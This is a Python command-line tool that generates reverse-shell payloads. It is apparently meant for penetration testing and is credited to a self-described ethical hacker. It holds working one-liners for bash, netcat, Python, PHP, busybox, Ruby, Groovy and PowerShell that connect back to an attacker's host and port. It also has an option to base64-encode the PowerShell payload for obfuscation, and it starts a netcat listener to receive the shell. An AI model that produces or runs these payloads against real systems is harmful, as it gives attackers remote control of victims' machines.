import argparse
import base64
import shutil
from colorama import init, Fore, Style
import sys
init(autoreset=True)
import os

#clear screen before running the tool
os.system("clear")

#Banner
line = "-"*120
small_line="-"*53

print(line)
str = '''
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗██████╗  █████╗ ███████╗████████╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║     ██████╔╝███████║█████╗     ██║   
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║     ██╔══██╗██╔══██║██╔══╝     ██║   
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗╚██████╗██║  ██║██║  ██║██║        ██║   
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝   
                                                                                                          
'''
print(f"{Fore.RED}{str}")
print(line)

print(f"{Fore.YELLOW} {small_line} About Author {small_line}")
print(f"\n{Fore.CYAN}--------------------- Kamlesh Kathiriya | Ethical Hacker & Penetraation Tester | @KamleshKathiriya ----------------------")

#reverse shell Payloads 
payloads = {
    "bash": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "nc": 'nc -e /bin/sh {lhost} {lport}',
    "nc_openbsd": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    "python": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
    "php": 'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "busybox": 'busybox nc {lhost} {lport} -e /bin/bash',
    "ruby": 'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "groovy": (
    'String host="{lhost}";'
    'int port={lport};'
    'String cmd="sh";'
    'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
    'Socket s=new Socket(host,port);'
    'InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();'
    'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
    'while(!s.isClosed()){{'
    'while(pi.available()>0)so.write(pi.read());'
    'while(pe.available()>0)so.write(pe.read());'
    'while(si.available()>0)po.write(si.read());'
    'so.flush();po.flush();Thread.sleep(50);'
    'try {{p.exitValue();break;}}catch (Exception e){{}}}};'
    'p.destroy();s.close();'
),
    "powershell": (
    'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
    '$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
    '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
    'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{'
    '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
    '$sendback = (iex $data 2>&1 | Out-String );'
    '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
    '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
    '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}'
)
}

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Generator")
    parser.add_argument("--lhost", required=True, help="Attacker IP")
    parser.add_argument("--lport", required=True, help="Attacker Port")
    parser.add_argument("--type", choices=payloads.keys(), required=True, help="Shell type (language/tool)")

    args = parser.parse_args()
    payload = payloads[args.type].format(lhost=args.lhost, lport=args.lport)
    print(f"{Fore.YELLOW}\n[+] Reverse Shell Payload ({args.type}):\n\n{Fore.BLUE}{payload}\n")
    
    #Base64 encode Powershell Payload
    if(args.type=="powershell"):
    	encodechoice=input(f"\n[?] Do you want to Encode the Powerhsell payload? (Y/N) => ").strip().lower()
    	if(encodechoice=='y'):
    		bs64=payload.encode('utf-16-le')
    		output=base64.b64encode(bs64)
    		print(f"{Fore.YELLOW}\n[+] Powershell Encoded Payload:\n{Fore.BLUE}powershell -e {output.decode()}\n\n")
    	else:
    		pass
    		sys.exit()
    
    #Save Output to file
    print(f"{Fore.YELLOW}[+] Save output to file:\n")
    output=input("[?] Do you want to store the output in file? (Y/N) => ").strip().lower()
    try:
        if(output=='y'):
        	fname=input("\nEnter the file name you want to save shell payload as: => ")
        	with open (fname,"w") as f:
        		f.write(payload)
        		f.close()
        		print(f"{Fore.GREEN}\n[+] File {fname} saved successfully!")
        		
        else:
        	pass
    except Exception as e:
    	print(e)
    print(f"\n{Fore.YELLOW}[+] Start netcat listener")
    
    #Check if rlwrap is exist before starting reverse shell listener
    if shutil.which("rlwrap"):
    	pass
    else:
    	print(f"{Fore.RED}[+] rlwrap is not installed!")
    	os.system("sudo apt install -y rlwrap")
    	sys.exit()
    choice = input("\n[?] Do you want to start listener? (Y/N) => ").strip().lower()

    try:
    	if(choice=='y'):
    		print("\n")
    		os.system(f"rlwrap -r nc -nvlp {args.lport}")
    	else:
    		print(f"\n{Fore.RED}[-] Good Bye!")
    except Exception as e:
    	print(e)
    	exit()

if __name__ == "__main__":
    main()
